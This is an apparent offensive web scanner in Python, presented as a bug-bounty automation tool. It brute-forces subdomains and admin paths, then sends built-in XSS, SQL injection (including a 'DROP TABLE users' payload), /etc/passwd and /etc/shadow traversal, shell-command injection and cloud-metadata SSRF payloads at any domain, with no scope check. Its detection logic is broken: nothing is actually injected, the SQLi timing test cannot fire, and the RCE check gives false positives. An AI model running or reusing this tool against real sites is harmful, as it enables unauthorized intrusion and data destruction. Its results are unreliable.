#!/usr/bin/env python3
"""
HYDRA-BUG ULTIMATE v3.0 - Bug Hunting Automation Framework
Professional Bug Bounty Automation Tool

Author: F1REW0LF
License: MIT
"""

import sys
import os
import re
import time
import json
import socket
import threading
import subprocess
import hashlib
import base64
import random
import asyncio
import aiohttp
from datetime import datetime
from typing import Dict, List, Optional, Tuple, Any
from urllib.parse import urlparse, urljoin, parse_qs, quote
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from bs4 import BeautifulSoup
import dns.resolver
import whois

VERSION = "3.0.0"
AUTHOR = "F1REW0LF"
LICENSE = "MIT"

class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    GOLD = '\033[93m'
    NEON = '\033[96m'
    WHITE = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    MAGENTA = '\033[95m'

def cprint(text, color=Colors.WHITE, bold=False):
    if bold:
        print(f"{Colors.BOLD}{color}{text}{Colors.WHITE}")
    else:
        print(f"{color}{text}{Colors.WHITE}")

def print_banner():
    banner = f"""
{Colors.GOLD}{Colors.BOLD}    ██╗  ██╗██╗   ██╗██████╗ ██████╗  █████╗ 
    ██║  ██║╚██╗ ██╔╝██╔══██╗██╔══██╗██╔══██╗
    ███████║ ╚████╔╝ ██║  ██║██████╔╝███████║
    ██╔══██║  ╚██╔╝  ██║  ██║██╔══██╗██╔══██║
    ██║  ██║   ██║   ██████╔╝██║  ██║██║  ██║
    ╚═╝  ╚═╝   ╚═╝   ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
                                                   
{Colors.NEON}          ULTIMATE v{VERSION} - BUG HUNTING{Colors.WHITE}
{Colors.CYAN}    Professional Bug Bounty Automation Tool{Colors.WHITE}
{Colors.YELLOW}    Author: {AUTHOR} | {LICENSE}{Colors.WHITE}
    """
    print(banner)
    print("=" * 80)

# ==================== UTILITIES ====================
class Utilities:
    @staticmethod
    def timestamp() -> str:
        return datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    @staticmethod
    def clean_url(url: str) -> str:
        return url.strip().rstrip('/')
    
    @staticmethod
    def extract_domain(url: str) -> str:
        parsed = urlparse(url)
        return parsed.netloc or parsed.path
    
    @staticmethod
    def random_string(length=8) -> str:
        return ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=length))
    
    @staticmethod
    def random_ip() -> str:
        return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"

# ==================== PAYLOAD ENGINE ====================
class PayloadEngine:
    @staticmethod
    def xss_payloads() -> List[str]:
        return [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "'><script>alert(1)</script>",
            "javascript:alert(1)",
            "<svg onload=alert(1)>",
            "';alert(1);//",
            "<iframe src=javascript:alert(1)>",
            "<body onload=alert(1)>",
            "<input onfocus=alert(1) autofocus>"
        ]
    
    @staticmethod
    def sqli_payloads() -> List[str]:
        return [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT NULL--",
            "'; DROP TABLE users--",
            "' AND SLEEP(5)--",
            "' AND 1=1--",
            "' AND 1=2--",
            "' UNION SELECT username, password FROM users--"
        ]
    
    @staticmethod
    def lfi_payloads() -> List[str]:
        return [
            "../../../../etc/passwd",
            "../../../etc/passwd",
            "../../etc/passwd",
            "....//....//....//etc/passwd",
            "../../../../etc/shadow",
            "../../../../windows/win.ini"
        ]
    
    @staticmethod
    def rce_payloads() -> List[str]:
        return [
            "; ls -la",
            "| ls -la",
            "|| ls -la",
            "&& ls -la",
            "; whoami",
            "| whoami",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "; id",
            "| id"
        ]
    
    @staticmethod
    def ssrf_payloads() -> List[str]:
        return [
            "http://169.254.169.254/latest/meta-data/",
            "http://127.0.0.1:8080/admin",
            "http://localhost:8080/admin",
            "file:///etc/passwd",
            "gopher://127.0.0.1:8080/_GET /admin HTTP/1.0%0d%0a%0d%0a"
        ]
    
    @staticmethod
    def host_header_payloads() -> List[str]:
        return [
            "evil.com",
            "attacker.com",
            "localhost",
            "127.0.0.1",
            "0.0.0.0"
        ]
    
    @staticmethod
    def crlf_payloads() -> List[str]:
        return [
            "%0d%0a",
            "%0a%0d",
            "%0d",
            "%0a"
        ]

# ==================== RECON ENGINE ====================
class ReconEngine:
    def __init__(self, target: str):
        self.target = target
        self.results = {
            'subdomains': [],
            'directories': [],
            'api_endpoints': [],
            'js_files': [],
            'css_files': []
        }
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
    
    def discover_subdomains(self) -> List[str]:
        cprint("[RECON] Discovering subdomains...", Colors.BLUE)
        
        common = ['www', 'mail', 'admin', 'api', 'dev', 'test', 'staging', 'prod', 'app', 'portal']
        found = []
        
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = {executor.submit(self._check_subdomain, sub): sub for sub in common}
            for future in as_completed(futures):
                result = future.result()
                if result:
                    found.append(result)
                    cprint(f"[+] Subdomain: {result}", Colors.GREEN)
        
        self.results['subdomains'] = found
        return found
    
    def _check_subdomain(self, sub: str) -> Optional[str]:
        try:
            domain = f"{sub}.{self.target}"
            socket.gethostbyname(domain)
            return domain
        except:
            return None
    
    def discover_directories(self) -> List[str]:
        cprint("[RECON] Discovering directories...", Colors.BLUE)
        
        common = ['admin', 'api', 'login', 'dashboard', 'panel', 'console', 'manage', 'phpmyadmin', 'wp-admin']
        found = []
        base = f"http://{self.target}"
        
        with ThreadPoolExecutor(max_workers=30) as executor:
            futures = {executor.submit(self._check_directory, base, d): d for d in common}
            for future in as_completed(futures):
                result = future.result()
                if result:
                    found.append(result)
                    cprint(f"[+] Directory: {result}", Colors.GREEN)
        
        self.results['directories'] = found
        return found
    
    def _check_directory(self, base: str, dir_path: str) -> Optional[str]:
        try:
            url = f"{base}/{dir_path}"
            response = self.session.get(url, timeout=3)
            if response.status_code in [200, 301, 302, 403]:
                return url
        except:
            pass
        return None
    
    def discover_api_endpoints(self) -> List[str]:
        cprint("[RECON] Discovering API endpoints...", Colors.BLUE)
        
        patterns = ['/api/', '/api/v1/', '/api/v2/', '/rest/', '/graphql', '/swagger', '/docs']
        found = []
        base = f"http://{self.target}"
        
        for pattern in patterns:
            try:
                url = f"{base}{pattern}"
                response = self.session.get(url, timeout=3)
                if response.status_code in [200, 301, 302, 403]:
                    found.append(url)
                    cprint(f"[+] API: {url}", Colors.GREEN)
            except:
                pass
        
        self.results['api_endpoints'] = found
        return found

# ==================== VULN SCANNER ====================
class VulnScanner:
    def __init__(self, target: str):
        self.target = target
        self.results = {
            'xss': [],
            'sqli': [],
            'lfi': [],
            'rce': [],
            'ssrf': [],
            'host_header': [],
            'crlf': []
        }
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.payloads = {
            'xss': PayloadEngine.xss_payloads(),
            'sqli': PayloadEngine.sqli_payloads(),
            'lfi': PayloadEngine.lfi_payloads(),
            'rce': PayloadEngine.rce_payloads(),
            'ssrf': PayloadEngine.ssrf_payloads(),
            'host_header': PayloadEngine.host_header_payloads(),
            'crlf': PayloadEngine.crlf_payloads()
        }
    
    def scan_xss(self, url: str, params: List[str]) -> List[Dict]:
        cprint("[XSS] Scanning for XSS...", Colors.YELLOW)
        vulns = []
        
        for param in params:
            for payload in self.payloads['xss']:
                try:
                    test_url = url.replace(param, f"{param}={payload}")
                    response = self.session.get(test_url, timeout=5)
                    if payload in response.text:
                        vulns.append({
                            'url': test_url,
                            'param': param,
                            'payload': payload,
                            'type': 'Reflected XSS',
                            'severity': 'High'
                        })
                        cprint(f"[!] XSS found", Colors.RED)
                        break
                except:
                    pass
        
        self.results['xss'] = vulns
        return vulns
    
    def scan_sqli(self, url: str, params: List[str]) -> List[Dict]:
        cprint("[SQLI] Scanning for SQL Injection...", Colors.YELLOW)
        vulns = []
        
        for param in params:
            for payload in self.payloads['sqli']:
                try:
                    test_url = url.replace(param, f"{param}={payload}")
                    start = time.time()
                    response = self.session.get(test_url, timeout=5)
                    elapsed = time.time() - start
                    
                    if elapsed > 5:
                        vulns.append({
                            'url': test_url,
                            'param': param,
                            'payload': payload,
                            'type': 'Blind SQL Injection',
                            'severity': 'Critical'
                        })
                        cprint(f"[!] SQLi found", Colors.RED)
                        break
                except:
                    pass
        
        self.results['sqli'] = vulns
        return vulns
    
    def scan_lfi(self, url: str, params: List[str]) -> List[Dict]:
        cprint("[LFI] Scanning for LFI...", Colors.YELLOW)
        vulns = []
        
        for param in params:
            for payload in self.payloads['lfi']:
                try:
                    test_url = url.replace(param, f"{param}={payload}")
                    response = self.session.get(test_url, timeout=5)
                    if 'root:' in response.text or 'bin:' in response.text:
                        vulns.append({
                            'url': test_url,
                            'param': param,
                            'payload': payload,
                            'type': 'LFI',
                            'severity': 'Critical'
                        })
                        cprint(f"[!] LFI found", Colors.RED)
                        break
                except:
                    pass
        
        self.results['lfi'] = vulns
        return vulns
    
    def scan_rce(self, url: str, params: List[str]) -> List[Dict]:
        cprint("[RCE] Scanning for RCE...", Colors.YELLOW)
        vulns = []
        
        for param in params:
            for payload in self.payloads['rce']:
                try:
                    test_url = url.replace(param, f"{param}={payload}")
                    response = self.session.get(test_url, timeout=5)
                    if 'uid=' in response.text or 'id=' in response.text:
                        vulns.append({
                            'url': test_url,
                            'param': param,
                            'payload': payload,
                            'type': 'RCE',
                            'severity': 'Critical'
                        })
                        cprint(f"[!] RCE found", Colors.RED)
                        break
                except:
                    pass
        
        self.results['rce'] = vulns
        return vulns

# ==================== MAIN FRAMEWORK ====================
class HydraBugUltimate:
    def __init__(self, target: str):
        self.target = target
        self.results = {}
        self.start_time = time.time()
        self.findings = {'total': 0, 'critical': 0, 'high': 0, 'medium': 0, 'low': 0}
    
    def run_scan(self) -> Dict:
        cprint("\n" + "="*80, Colors.GOLD)
        cprint(" HYDRA-BUG SCAN - v{}".format(VERSION), Colors.GOLD, bold=True)
        cprint("="*80, Colors.GOLD)
        cprint(f"[*] Target: {self.target}", Colors.CYAN)
        
        # Recon
        recon = ReconEngine(self.target)
        self.results['recon'] = {
            'subdomains': recon.discover_subdomains(),
            'directories': recon.discover_directories(),
            'api_endpoints': recon.discover_api_endpoints()
        }
        
        # Vuln Scan
        vuln = VulnScanner(self.target)
        params = ['id', 'q', 'page', 'p', 'user', 'username', 'name', 'key']
        base = f"http://{self.target}/test.php"
        
        self.results['vuln'] = {
            'xss': vuln.scan_xss(base, params),
            'sqli': vuln.scan_sqli(base, params),
            'lfi': vuln.scan_lfi(base, params),
            'rce': vuln.scan_rce(base, params)
        }
        
        # Stats
        for vuln_type, findings in self.results['vuln'].items():
            if isinstance(findings, list):
                self.findings['total'] += len(findings)
                for f in findings:
                    severity = f.get('severity', 'Info')
                    if severity == 'Critical':
                        self.findings['critical'] += 1
                    elif severity == 'High':
                        self.findings['high'] += 1
                    elif severity == 'Medium':
                        self.findings['medium'] += 1
                    else:
                        self.findings['low'] += 1
        
        self._generate_report()
        return self.results
    
    def _generate_report(self):
        cprint("\n[REPORT] Generating report...", Colors.GOLD)
        
        elapsed = int(time.time() - self.start_time)
        timestamp = Utilities.timestamp()
        
        # JSON
        json_file = f"hydra_report_{self.target}_{int(time.time())}.json"
        self.results['metadata'] = {
            'timestamp': timestamp,
            'elapsed': elapsed,
            'findings': self.findings
        }
        with open(json_file, 'w') as f:
            json.dump(self.results, f, indent=2)
        cprint(f"[+] JSON: {json_file}", Colors.GREEN)
        
        # HTML
        html_file = f"hydra_report_{self.target}_{int(time.time())}.html"
        with open(html_file, 'w') as f:
            f.write(self._generate_html(timestamp, elapsed))
        cprint(f"[+] HTML: {html_file}", Colors.GREEN)
    
    def _generate_html(self, timestamp: str, elapsed: int) -> str:
        return f"""
<!DOCTYPE html>
<html>
<head><title>HYDRA-BUG - Security Report</title>
<style>
body {{ background: #0a0a0a; color: #00ff41; font-family: monospace; padding: 20px; }}
.header {{ border-bottom: 2px solid #ffd700; padding-bottom: 10px; }}
.section {{ background: #111; padding: 15px; margin: 10px 0; border: 1px solid #333; }}
.critical {{ color: #ff003c; }}
.high {{ color: #ff8a00; }}
.medium {{ color: #ffa500; }}
.low {{ color: #ffd700; }}
table {{ width: 100%; border-collapse: collapse; }}
td, th {{ padding: 8px; border: 1px solid #333; }}
th {{ background: #222; color: #ffd700; }}
</style></head>
<body>
<div class="header">
<h1 style="color:#ffd700;">HYDRA-BUG ULTIMATE v{VERSION}</h1>
<p>Target: {self.target}</p>
<p>Generated: {timestamp}</p>
<p>Duration: {elapsed}s</p>
</div>
<div class="section">
<h2>Findings Summary</h2>
<p>Total: {self.findings['total']}</p>
<p class="critical">Critical: {self.findings['critical']}</p>
<p class="high">High: {self.findings['high']}</p>
<p class="medium">Medium: {self.findings['medium']}</p>
<p class="low">Low: {self.findings['low']}</p>
</div>
<div class="section">
<h2>Vulnerability Details</h2>
{self._vuln_table()}
</div>
<div style="text-align:center;color:#666;">
<p>Author: {AUTHOR} | {LICENSE}</p>
</div>
</body></html>
"""
    
    def _vuln_table(self) -> str:
        html = ""
        vuln_data = self.results.get('vuln', {})
        
        for vuln_name, vuln_key in [
            ('XSS', 'xss'), ('SQL Injection', 'sqli'), ('LFI', 'lfi'), ('RCE', 'rce')
        ]:
            findings = vuln_data.get(vuln_key, [])
            if findings:
                html += f"<h3>{vuln_name}</h3><table><tr><th>URL</th><th>Payload</th><th>Severity</th></tr>"
                for f in findings:
                    html += f"""
                    <tr>
                        <td>{f.get('url', 'N/A')[:80]}...</td>
                        <td>{f.get('payload', 'N/A')}</td>
                        <td>{f.get('severity', 'Info')}</td>
                    </tr>
                    """
                html += "</table>"
        
        return html
    
    def show_summary(self):
        cprint("\n" + "="*80, Colors.GOLD)
        cprint(" SCAN COMPLETE", Colors.GOLD, bold=True)
        cprint("="*80, Colors.GOLD)
        cprint(f"[+] Target: {self.target}", Colors.CYAN)
        cprint(f"[+] Total Findings: {self.findings['total']}", Colors.YELLOW)
        cprint(f"[+] Critical: {self.findings['critical']}", Colors.RED)
        cprint(f"[+] High: {self.findings['high']}", Colors.YELLOW)
        cprint(f"[+] Medium: {self.findings['medium']}", Colors.BLUE)
        cprint(f"[+] Low: {self.findings['low']}", Colors.GREEN)
        cprint(f"[*] Time: {int(time.time() - self.start_time)}s", Colors.DIM)

# ==================== MAIN ====================
def main():
    import argparse
    
    parser = argparse.ArgumentParser(
        description="HYDRA-BUG ULTIMATE - Bug Hunting Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 hydra_bug_ultimate.py -t example.com
        """
    )
    
    parser.add_argument("-t", "--target", required=True, help="Target domain")
    parser.add_argument("-o", "--output", help="Output directory")
    
    args = parser.parse_args()
    
    print_banner()
    
    tool = HydraBugUltimate(args.target)
    tool.run_scan()
    tool.show_summary()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        cprint("\n[!] Interrupted", Colors.RED)
        sys.exit(0)
